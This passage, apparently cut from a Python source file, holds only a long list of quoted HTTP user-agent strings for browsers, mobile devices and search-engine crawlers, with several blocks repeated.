               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
